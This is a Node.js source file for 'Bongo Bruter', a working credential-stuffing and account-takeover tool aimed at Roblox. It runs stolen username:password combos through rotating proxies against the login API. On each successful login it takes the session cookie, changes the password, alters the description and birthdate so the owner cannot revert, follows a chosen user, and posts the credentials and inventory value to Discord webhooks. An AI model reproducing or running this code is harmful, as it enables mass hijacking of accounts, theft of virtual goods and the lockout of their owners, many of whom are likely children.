/*

██████╗░░█████╗░███╗░░██╗░██████╗░░█████╗░  ██████╗░██████╗░██╗░░░██╗████████╗███████╗██████╗░
██╔══██╗██╔══██╗████╗░██║██╔════╝░██╔══██╗  ██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔══██╗
██████╦╝██║░░██║██╔██╗██║██║░░██╗░██║░░██║  ██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░██████╔╝
██╔══██╗██║░░██║██║╚████║██║░░╚██╗██║░░██║  ██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══██╗
██████╦╝╚█████╔╝██║░╚███║╚██████╔╝╚█████╔╝  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░██║
╚═════╝░░╚════╝░╚═╝░░╚══╝░╚═════╝░░╚════╝░  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝

- Made by 1bongo1
- Created BEFORE nova leak
- Super fast

Required file structure:
    output
        2fa.txt
        captcha.txt
        changed.txt
        hitfail.txt
        hits.txt
        locked.txt
    cache.txt
    proxies.txt
    index.js
    (other node files)

Any hits that were unable to change password/description/follow/birthday are put in hitfail.txt (oftentimes just putting the failed combo back into combos.txt and turning off cache is enough to fix this)

Proxy Format (choose one of the below)
    host:port:username:password
    username:password@host:port
    host:port (proxies without auth ONLY)

*/

// CONFIG
const THREADS = 200 // don't make longer than the amount of proxies you have (good value:100)
const ignoreCache = true // ignore cache.txt and use all combos regardless if they've been checked before
const changeDescription = "1bongo1 was here" // change "..." to null (no quotes) to not change description
const followUserID = 82370367 // change to null (no quotes) to not follow someone
const autoUnderage = true // whether to auto underage the account for a day (disable revert links)
const passwordChanger = {
    enabled: true,
    changeTo: "bongo", // if varyPasswords is enabled, an underscore and random characters will be added at the end of this, if not then this will be the new password
    varyPasswords: true, // (DONT DISABLE THIS) whether to append random characters at the end of your changeTo to vary the passwords (ex: _k8d2!l)
    charSet: "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ123456789" // character set to choose from for varying passwords
}
const webhooks = {
    enabled: true,
    // to disable any of the below individually, change "..." to null (no quotes)
    hits: "URL",
    locked: "URL",
    twostep: "URL",
}
const silenceCaptchas = false // whether to print to not print to console for captchas

// BONGO BRUTER
const axios = require('axios-https-proxy-fix')
const fs = require('fs')
const readline = require('readline')
const crypto = require('crypto')
const http = require('http')
const webhook = require('discord-webhook-node')

const internet = axios.create({
    timeout: 30000,
    httpAgent: new http.Agent({ keepAlive: true }),
});
let whs = {
    "hits": (webhooks.enabled && webhooks.hits && webhooks.hits!="URL") ? new webhook.Webhook({
        url: webhooks.hits,
        throwErrors: false,
    }) : null,
    "locked": (webhooks.enabled && webhooks.locked && webhooks.locked!="URL") ? new webhook.Webhook({
        url: webhooks.locked,
        throwErrors: false,
    }) : null,
    "twostep": (webhooks.enabled && webhooks.twostep && webhooks.twostep!="URL") ? new webhook.Webhook({
        url: webhooks.twostep,
        throwErrors: false,
    }) : null,
    "errors": (webhooks.enabled && webhooks.errors && webhooks.errors!="URL") ? new webhook.Webhook({
        url: webhooks.errors,
        throwErrors: false,
    }) : null,
}

let combos = []
let proxies = []

let bad = 0
let good = 0
let outputInterval
let fetchNew = 0
let useOld = 0
let benchmark = Date.now()

const consoleColors = {
    green: "\x1b[32m",
    red: "\x1b[31m",
    blue: "\x1b[34m",
    yellow: "\x1b[33m",
    reset: "\x1b[0m",
}

async function importCombos() {
    const fileStream = fs.createReadStream("combos.txt");
  
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });

    let tempCombos = {}

    let comboCount = 0
    for await (const line of rl) {
        tempCombos[line] = true
    }

    fileStream.destroy()

    if(!ignoreCache){
        const fileStream2 = fs.createReadStream("cache.txt");
  
        const rl2 = readline.createInterface({
            input: fileStream2,
            crlfDelay: Infinity
        });
    
        for await (const line of rl2) {
            let combo = line.split("|")[0]
            delete tempCombos[combo]
        }
    
        fileStream2.destroy()
    }

    for(let combo of Object.keys(tempCombos)){
        if(tempCombos[combo]){
            comboCount++
            combos.push(combo)
            delete tempCombos[combo]
        }
    }
    return comboCount
}

async function importProxies() {
    const fileStream = fs.createReadStream("proxies.txt");
  
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });

    for await (const line of rl) {
        proxies.push(line)
    }

    console.log(consoleColors.blue+`Loaded ${proxies.length} proxies`+consoleColors.reset)

    fileStream.destroy()
}

function genRandomString(length){
    let newStr = ""
    for(let i=0;i<length;i++){
        newStr = newStr+passwordChanger.charSet.charAt(Math.floor(Math.random()*passwordChanger.charSet.length))
    }
    return newStr
}

class Thread {
    constructor(id) {
        this.id = id
        this.proxyUses = 0
        this.changeProxy = async ()=>{
            if(proxies.length==0){
                await importProxies()
            }
            let proxyIndex = Math.floor(Math.random()*proxies.length)
            let newProxy = proxies.splice(proxyIndex,1)[0]
            if(newProxy.includes("@")){
                let split = newProxy.split("@")
                let split1 = split[0].split(":")
                let split2 = split[1].split(":")
                this.proxy = {
                    "protocol": 'http',
                    "host": split2[0],
                    "port": parseInt(split2[1]),
                    "auth": {
                        "username": split1[0],
                        "password": split1[1]
                    },
                }
            }else{
                let split = newProxy.split(":")
                if(split.length==2){
                    this.proxy = {
                        "protocol": 'http',
                        "host": split[0],
                        "port": parseInt(split[1]),
                    }
                }else{
                    this.proxy = {
                        "protocol": 'http',
                        "host": split[0],
                        "port": parseInt(split[1]),
                        "auth": {
                            "username": split[2],
                            "password": split[3]
                        },
                    }
                }
            }
            // console.log(consoleColors.blue+`(${this.id}) proxy rotated `+consoleColors.reset)
            this.proxyUses = 0
            this.headers["x-csrf-token"] = null
            return newProxy
        }
        this.getCookies = (roblosecurity)=>{
            let cookies = {
                "_gcl_au": "1.1.191582745.1703431727",
                "GuestData": "UserID=-"+(1521315+(Math.floor(Math.random()*1000))),
                "rbx-ip2": "",
                "RBXEventTrackerV2": "CreateDate=3/21/2024 10:16:19 PM&rbxid=5369853971&browserid=212788924979",
                "RBXSessionTracker": "sessionid="+crypto.randomUUID(),
                "RBXSource": "rbx_acquisition_time=3/21/2024 9:28:47 AM&rbx_acquisition_referrer=https://www.roblox.com/&rbx_medium=Direct&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1",
            }
            if(roblosecurity){
                cookies[".ROBLOSECURITY"] = roblosecurity
            }
            let formatted = ""
            for(let cookie of Object.keys(cookies)){
                if(cookies[cookie]){
                    formatted = formatted+cookie+"="+cookies[cookie]+"; "
                }
            }
            return formatted.slice(0, -2)
        }
        this.changeDescription = (username,password)=>{
            return new Promise((resolve,reject)=>{
                if(changeDescription){
                    internet.get("https://users.roblox.com/v1/description",{
                        headers: this.headers,
                        withCredentials: true,
                        proxy: this.proxy,
                    }).then((response)=>{
                        let existing = (response.data && response.data.description) ? response.data.description : ""
                        let newDescription = changeDescription
                        if(existing.length>0){
                            newDescription = changeDescription+"\n\n"+existing
                        }
                        if(newDescription.length>1000){
                            newDescription = newDescription.substring(0,1000)
                        }
                        internet.post("https://users.roblox.com/v1/description",{
                            "description": newDescription
                        },{
                            headers: this.headers,
                            withCredentials: true,
                            proxy: this.proxy,
                        }).then(()=>{
                            resolve(true)
                        }).catch((err)=>{
                            console.log(consoleColors.red+"[-] Couldn't change description: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                            fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ DESCRIPTION CHANGE FAIL (2) | ${err}\n`)
                            resolve(false)
                        })
                    }).catch((err)=>{
                        console.log(consoleColors.red+"[-] Couldn't change description: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                        fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ DESCRIPTION CHANGE FAIL (1) | ${err}\n`)
                        resolve(false)
                    })
                }else{
                    return resolve(true)
                }
            })
        }
        this.updateBirthday = (username,password)=>{
            return new Promise(async (resolve,reject)=>{
                const now = new Date()
                let targetBday = new Date(now.getFullYear()-13,now.getMonth(),now.getDate())
                targetBday.setDate(targetBday.getDate()+2)
                let payload = {
                    "birthMonth": targetBday.getMonth()+1, // 0-11 so +1
                    "birthDay": targetBday.getDate(),
                    "birthYear": targetBday.getFullYear(),
                    "password": password
                }
                if(autoUnderage){
                    internet.post("https://users.roblox.com/v1/birthdate",payload,{
                        headers: this.headers,
                        withCredentials: true,
                        validateStatus:()=>true,
                        proxy: this.proxy,
                    }).then((r1)=>{
                        if(r1.status==403){
                            internet.post("https://apis.roblox.com/reauthentication-service/v1/token/generate",{
                                "password": password
                            },{
                                headers: this.headers,
                                withCredentials: true,
                                proxy: this.proxy,
                            }).then((r2)=>{
                                if(r2.data.token){
                                    internet.post("https://apis.roblox.com/challenge/v1/continue",{
                                        "challengeId": r1.headers["rblx-challenge-id"],
                                        "challengeMetadata": `{"reauthenticationToken":"${r2.data.token}"}`,
                                        "challengeType": "reauthentication"
                                    },{
                                        headers: this.headers,
                                        withCredentials: true,
                                        proxy: this.proxy,
                                    }).then(()=>{
                                        internet.post("https://users.roblox.com/v1/birthdate",payload,{
                                            headers: this.headers,
                                            withCredentials: true,
                                            proxy: this.proxy,
                                        }).then(()=>{
                                            resolve(true)
                                        }).catch((err)=>{
                                            console.log(consoleColors.red+"[-] Couldn't change birthday: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                            fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ BIRTHDAY CHANGE FAIL (6) - account is likely already underaged | ${err}\n`)
                                            resolve(false)
                                        })
                                    }).catch((err)=>{
                                        console.log(consoleColors.red+"[-] Couldn't change birthday: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                        fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ BIRTHDAY CHANGE FAIL (5) | ${err}\n`)
                                        resolve(false)
                                    })
                                }else{
                                    console.log(consoleColors.red+"[-] Couldn't change birthday: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                    fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ BIRTHDAY CHANGE FAIL (4) | ${err}\n`)
                                    resolve(false)
                                }
                            }).catch((err)=>{
                                console.log(consoleColors.red+"[-] Couldn't change birthday: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ BIRTHDAY CHANGE FAIL (3) | ${err}\n`)
                                resolve(false)
                            })
                        }else{
                            console.log(consoleColors.red+"[-] Couldn't change birthday: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                            fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ BIRTHDAY CHANGE FAIL (2) | ${err}\n`)
                            resolve(false)
                        }
                    }).catch((err)=>{
                        console.log(consoleColors.red+"[-] Couldn't change birthday: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                        fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ BIRTHDAY CHANGE FAIL (1) | ${err}\n`)
                        resolve(false)
                    })
                }else{
                    return resolve(true)
                }
            })
        }
        this.followUser = (username,password)=>{
            return new Promise((resolve,reject)=>{
                if(followUserID){
                    internet.post(`https://friends.roblox.com/v1/users/${followUserID}/follow`,{},{
                        headers: this.headers,
                        withCredentials: true,
                        proxy: this.proxy,
                    }).then(()=>{
                        resolve(true)
                    }).catch((err)=>{
                        console.log(consoleColors.red+"[-] Couldn't follow target: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                        fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ FOLLOW FAIL | ${err}\n`)
                        resolve(false)
                    })
                }else{
                    return resolve(true)
                }
            })
        }
        this.headers = {
            "authority": "auth.roblox.com",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.roblox.com",
            "pragma": "no-cache",
            "referer": "https://www.roblox.com/login",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91",
            "cookie": this.getCookies(),
            // "x-bound-auth-token": "7nCOTRhERkMD0SLRVxSZtx0mCVbmbfXB6ipBLPpBW2A=|1710908770|M7pSe84WwXMquCaZxv/tFFvGQLMkxPqvENjziv2Jr+N2uv8tTyVMdn4/D9NG678Bgy3ThIP16AmkrTWR27zfIA=="
        }
        this.getToken = (url,payload,proxy)=>{
            this.headers["x-csrf-token"] = null
            return new Promise((resolve,reject)=>{

                // internet.get("https://users.roblox.com/v1/users/82370367",{
                //     headers,
                //     // // Don't throw when the status code is 500
                //     validateStatus: ()=>true,
                //     withCredentials: true,
                //     proxy,
                // }).then((response)=>{
                //     // console.log(response.headers)
                //     console.log(response)
                // }).catch((err)=>{
                //     await this.changeProxy()
                //     return reject(err)
                // })

                this.proxyUses++
                internet.post(url,payload,{
                    headers: this.headers,
                    validateStatus: ()=>true,
                    withCredentials: true,
                    proxy,
                }).then(async (response)=>{
                    // console.log(response.headers)
                    // console.log(response)
                    let token = response.headers["x-csrf-token"]
                    // console.log(response)
                    if(!token){
                        await this.changeProxy()
                        return reject("No token returned")
                    }else{
                        // console.log(response.body)
                        this.headers["x-csrf-token"] = token
                        return resolve(token)
                    }
                }).catch(async (err)=>{
                    await this.changeProxy()
                    return reject(err)
                })
            })
        }
        this.changeProxy()

    }
    login(username,password){
        return new Promise(async (resolve,reject)=>{
            await this.changeProxy()
            this.headers["cookie"] = this.getCookies()
            let timeout = setTimeout(()=>{
                this.changeProxy()
                console.log(consoleColors.yellow+"[-] Timed Out: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                resolve("retry")
            },30000)
            let payload = {
                "ctype": username.includes("@") ? "email" : "username",
                "cvalue": username,
                "password": password,
                // "proxy": this.proxy,
            }
            // if(this.proxyUses>3){
            //     await this.changeProxy()
            // }
            if(!this.headers["x-csrf-token"]){
                try{
                    await this.getToken("https://auth.roblox.com/v2/login",payload,this.proxy)
                }catch(err){
                    console.log(consoleColors.red+`(${this.id}) failed to fetch login token: `+err+consoleColors.reset)
                    clearTimeout(timeout)
                    resolve("retry")
                }
                fetchNew++
            }else{
                useOld++
            }

            // internet.get("http://checkip.dyndns.org/",payload).then((r)=>{
            //     console.log(r)
            // })
            this.proxyUses++
            internet.post("https://auth.roblox.com/v2/login",payload,{
                headers: this.headers,
                validateStatus: ()=>true,
                withCredentials: true,
                proxy: this.proxy,
            }).then(async (response)=>{
                fs.appendFileSync("cache.txt",`${username}:${password}|${JSON.stringify(response.data)}\n`)
                if(response.status==403){
                    if(response.data.errors && response.data.errors[0]){
                        let error = response.data.errors[0]
                        if(error.code==0){
                            if(!silenceCaptchas){
                                console.log(consoleColors.yellow+"[-] Captcha: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                            }
                            fs.appendFileSync("output/captcha.txt",`${username}:${password}\n`)
                            bad++
                            // await this.changeProxy()
                            clearTimeout(timeout)
                            return resolve("captcha")
                        }else if(error.code==1){
                            console.log(consoleColors.red+"[-] Invalid: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                            good++
                            clearTimeout(timeout)
                            return resolve("invalid")
                        }else if(error.code==4){
                            console.log(consoleColors.blue+"[-] Locked: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                            good++
                            fs.appendFileSync("output/locked.txt",`${username}:${password}\n`)
                            clearTimeout(timeout)
                            const embed = new webhook.MessageBuilder()
                                .setTitle("Locked Hit")
                                .setColor("#0096FF")
                                .setDescription("**Combo: **||`"+username+":"+password+"`||")
                                .setFooter("Bongo Bruter", 'https://i.imgur.com/KyJfiTX.jpeg')
                            if(whs.locked){
                                whs.locked.send(embed)
                            }
                            return resolve("locked")
                        }else{
                            console.log(consoleColors.red+"[-] ERROR ("+error.code+"): "+username+":"+password+" - "+error.message+consoleColors.reset+" ("+this.id+")")
                            fs.appendFileSync("output/locked.txt",`${username}:${password}\n`)
                            bad++
                            clearTimeout(timeout)
                            return resolve("special")
                        }
                    }else if(response.data.code==0){
                        let token = response.headers["x-csrf-token"]
                        if(!token){
                            this.headers["x-csrf-token"] = null
                        }else{
                            this.headers["x-csrf-token"] = token
                        }
                        console.log(consoleColors.red+`(${this.id}) x-csrf-token expired, fetching a new one`+consoleColors.reset)
                        clearTimeout(timeout)
                        return resolve("retry")
                    }
                }else if(response.status==429){
                    console.log(consoleColors.red+`(${this.id}) proxy rate limitted, switching proxies`+consoleColors.reset)
                    clearTimeout(timeout)
                    await this.changeProxy()
                    return resolve("retry")
                }else if(response.status==200){
                    if(response.data["twoStepVerificationData"]){
                        good++
                        console.log(consoleColors.blue+"[-] 2FA ("+response.data.twoStepVerificationData.mediaType+"): "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                        fs.appendFileSync("output/2fa.txt",`${username}:${password}\n`)
                        clearTimeout(timeout)
                        const embed = new webhook.MessageBuilder()
                            .setTitle("2FA Hit")
                            .setColor("#0096FF")
                            .setDescription("**Combo: **||`"+username+":"+password+"`||")
                            .setFooter("Bongo Bruter", 'https://i.imgur.com/KyJfiTX.jpeg')
                        if(whs.twostep){
                            whs.twostep.send(embed)
                        }
                        return resolve("special")
                    }else if(response.headers["set-cookie"]){
                        good++
                        console.log(consoleColors.green+"[+] Hit: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                        const cookie = response.headers["set-cookie"][0].split(";")[0].split("=")[1]
                        clearTimeout(timeout)
                        fs.appendFileSync("output/hits.txt",`${username}:${password} ~ ${cookie}\n`)
                        this.headers["cookie"] = this.getCookies(cookie)
                        const changed = passwordChanger.enabled ? passwordChanger.changeTo+(passwordChanger.varyPasswords ? "_"+genRandomString(6) : "") : password
                        const desc = "**Combo: **||`"+username+":"+changed+"`||\n**OGP: **||`"+password+"`||\n"
                        const userId = response.data.user.id
                        function errorWebhook(e){
                            const embed = new webhook.MessageBuilder()
                                .setTitle("New Hit")
                                .setColor("#ffff00")
                                .setDescription(desc+"**Failed to load full embed due to an error**\n```"+e+"```")
                                .setFooter("Bongo Bruter", 'https://i.imgur.com/KyJfiTX.jpeg')
                            if(whs.hits){
                                whs.hits.send(embed)
                            }
                        }
                        internet.post("https://auth.roblox.com/v2/logout",null,{
                            headers: this.headers,
                            withCredentials: true,
                            proxy: this.proxy,
                            validateStatus: ()=>true,
                        }).then(async (response2)=>{
                            let token = response2.headers["x-csrf-token"]
                            if(!token){
                                console.log(consoleColors.red+"[-] Couldn't finish securing (1): "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ SECURING FAIL (NO TOKEN) | ${JSON.stringify(response.body)}\n`)
                            }else{
                                this.headers["x-csrf-token"] = token
                                internet.get(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=720x720&format=Png&isCircular=false`,{
                                    headers: this.headers,
                                    withCredentials: true,
                                    proxy: this.proxy,
                                    validateStatus: ()=>true,
                                }).then((info1)=>{
                                    let imageUrl
                                    try{
                                        imageUrl = info1.data.data[0].imageUrl
                                    }catch{}
                                    if(!response.data.isBanned){
                                        internet.get("https://auth.roblox.com/v1/account/pin",{
                                            headers: this.headers,
                                            withCredentials: true,
                                            proxy: this.proxy,
                                        }).then((info2)=>{
                                            let pinEnabled = info2.data["isEnabled"]
                                            if(pinEnabled!=null){
                                                internet.get("https://inventory.roblox.com/v1/users/"+userId+"/can-view-inventory",{
                                                    headers: this.headers,
                                                    withCredentials: true,
                                                    proxy: this.proxy,
                                                }).then(async (info3)=>{
                                                    let inventoryPublic = info3.data["canView"]
                                                    if(inventoryPublic!=null){
                                                        if(inventoryPublic){
                                                            let hats = 0
                                                            let hatsCursor = null
                                                            while(true){
                                                                let r
                                                                try{
                                                                    r = await internet.get("https://inventory.roblox.com/v2/users/"+userId+"/inventory/8?limit=100&sortOrder=Asc"+(hatsCursor ? "&cursor="+hatsCursor : ""),{
                                                                        headers: this.headers,
                                                                        withCredentials: true,
                                                                        proxy: this.proxy,
                                                                    })
                                                                }catch{
                                                                    hats = "Error"
                                                                    break
                                                                }
                                                                if(r && r.data && r.data.data){
                                                                    hats += r.data.data.length
                                                                    if(r.data["nextPageCursor"]){
                                                                        hatsCursor = r.data["nextPageCursor"]
                                                                    }else{
                                                                        break
                                                                    }
                                                                }
                                                            }
                                                            let rap = 0
                                                            let rapCursor = null
                                                            while(true){
                                                                let r
                                                                try{
                                                                    r = await internet.get("https://inventory.roblox.com/v1/users/"+userId+"/assets/collectibles?limit=100&sortOrder=Asc"+(rapCursor ? "&cursor="+rapCursor : ""),{
                                                                        headers: this.headers,
                                                                        withCredentials: true,
                                                                        proxy: this.proxy,
                                                                    })
                                                                }catch{
                                                                    rap = "Error"
                                                                    break
                                                                }
                                                                if(r && r.data && r.data.data){
                                                                    for(let item of r.data.data){
                                                                        if(item["recentAveragePrice"]){
                                                                            rap += item["recentAveragePrice"]
                                                                        }
                                                                    }
                                                                    if(r.data["nextPageCursor"]){
                                                                        rapCursor = r.data["nextPageCursor"]
                                                                    }else{
                                                                        break
                                                                    }
                                                                }
                                                            }
                                                            const embed = new webhook.MessageBuilder()
                                                                .setTitle("New Hit")
                                                                .setColor("#00ff00")
                                                                .setDescription(desc+"**Banned: **`False`\n**Pin Locked: **`"+(pinEnabled?"True":"False")+"`\n**Inventory Public: **`True`\n**Hats Owned: **`"+hats+"`\n**RAP: **`"+rap+"`")
                                                                .setFooter("Bongo Bruter", 'https://i.imgur.com/KyJfiTX.jpeg')
                                                            if(imageUrl){
                                                                embed.setThumbnail(imageUrl)
                                                            }
                                                            if(whs.hits){
                                                                whs.hits.send(embed)
                                                            }
                                                        }else{
                                                            const embed = new webhook.MessageBuilder()
                                                                .setTitle("New Hit")
                                                                .setColor("#00ff00")
                                                                .setDescription(desc+"**Banned: **`False`\n**Pin Locked: **`"+(pinEnabled?"True":"False")+"`\n**Inventory Public: **`False`")
                                                                .setFooter("Bongo Bruter", 'https://i.imgur.com/KyJfiTX.jpeg')
                                                            if(imageUrl){
                                                                embed.setThumbnail(imageUrl)
                                                            }
                                                            if(whs.hits){
                                                                whs.hits.send(embed)
                                                            }
                                                        }
                                                    }else{
                                                        console.log(consoleColors.red+"[-] Couldn't fetch inventory status: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                                        errorWebhook("Inventory public response contains no data")
                                                    }
                                                }).catch((err)=>{
                                                    console.log(consoleColors.red+"[-] Couldn't fetch inventory status: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                                    errorWebhook(err)
                                                })
                                            }else{
                                                console.log(consoleColors.red+"[-] Couldn't fetch pin info: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                                errorWebhook("Pin response contains no data")
                                            }
                                        }).catch((err)=>{
                                            console.log(consoleColors.red+"[-] Couldn't fetch pin info: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                            errorWebhook(err)
                                        })
                                    }else{
                                        const embed = new webhook.MessageBuilder()
                                            .setTitle("New Hit")
                                            .setColor("#ff0000")
                                            .setDescription(desc+"**Banned: **`True`")
                                            .setFooter("Bongo Bruter", 'https://i.imgur.com/KyJfiTX.jpeg')
                                        if(imageUrl){
                                            embed.setThumbnail(imageUrl)
                                        }
                                        if(whs.hits){
                                            whs.hits.send(embed)
                                        }
                                    }
                                }).catch(()=>{
                                    console.log(consoleColors.red+"[-] Couldn't fetch headshot: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                    errorWebhook()
                                })
                                internet.post("https://usermoderation.roblox.com/v1/not-approved/reactivate",null,{
                                    headers: this.headers,
                                    withCredentials: true,
                                    proxy: this.proxy,
                                }).then(async ()=>{
                                    await this.changeDescription(username,password)
                                    await this.updateBirthday(username,password)
                                    await this.followUser(username,password)
                                    if(passwordChanger.enabled){
                                        internet.post("https://auth.roblox.com/v1/user/passwords/change",{
                                            "currentPassword": password,
                                            "newPassword": changed,
                                        },{
                                            headers: this.headers,
                                            withCredentials: true,
                                            proxy: this.proxy,
                                        }).then(()=>{
                                            console.log(consoleColors.green+"[+] Password Changed: "+username+":"+changed+consoleColors.reset+" ("+this.id+")")
                                            fs.appendFileSync("output/changed.txt",`${username}:${changed}\n`)
                                            return resolve("hit")
                                        }).catch((err)=>{
                                            console.log(consoleColors.red+"[-] Couldn't change password: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                            fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ PW CHANGE FAIL | ${err}\n`)
                                            return resolve("hit")
                                        })
                                    }else{
                                        return resolve("hit")
                                    }
                                }).catch((err)=>{
                                    console.log(consoleColors.red+"[-] Couldn't finish securing (2): "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                                    fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ FAILED TO REACTIVATE | ${err}\n`)
                                    return resolve("hit")
                                })
                            }
                        }).catch(async (err)=>{
                            console.log(consoleColors.red+"[-] Couldn't change password: "+username+":"+password+consoleColors.reset+" ("+this.id+")")
                            fs.appendFileSync("output/hitfail.txt",`${username}:${password} ~ LOGOUT SECURE FAIL | ${err}\n`)
                            return resolve("hit")
                        })
                    }
                    // written by 1bongo1 BEFORE nova even leaked his shitty chat gpted slow thing
                }else{
                    console.log(consoleColors.red+"UNKNOWN RESPONSE CODE ("+response.status+"): "+response.data+consoleColors.reset+" ("+this.id+")")
                    clearTimeout(timeout)
                    return resolve("unknown")
                }
            }).catch(async (err)=>{
                clearTimeout(timeout)
                await this.changeProxy()
                return resolve("retry")
            })
        })
    }
    async execute(){
        while(combos.length>0){
            let combo = combos.pop()
            let split = combo.split(":")
            // console.log("trying "+combo)
            let result
            try{
                result = await this.login(split[0],split[1])
            }catch{}
            if(result=="retry"){
                try{
                    result = await this.login(split[0],split[1])
                }catch{}
            }
        }
        try{
            clearInterval(outputInterval)
        }catch{}
        console.log(consoleColors.blue+`(${this.id}) thread completed, took ${Math.round((Date.now()-benchmark)/1000)} seconds`+consoleColors.reset)
    }
}

async function main(){
    console.log("Bongo Bruter initiating...")
    const comboCount = await importCombos()
    await importProxies()
    let threadAmount = THREADS>comboCount ? comboCount : THREADS
    for(let i=0;i<threadAmount;i++){
        let thread = new Thread("thread_"+i)
        thread.execute()
    }
    console.log(`${threadAmount} threads launched, ${comboCount} combos loaded`)
    if(threadAmount==0){
        clearInterval(outputInterval)
    }
}

outputInterval = setInterval(()=>{
    // console.log("nocap percent: "+Math.round(good/(good+bad)*100)+"% (good:"+good+", bad:"+bad+")")
    // console.log("xcsrf percent: "+Math.round(fetchNew/(fetchNew+useOld)*100)+"% (new:"+fetchNew+", old:"+useOld+")")
},1000)
// console.log(axios.storage)
main()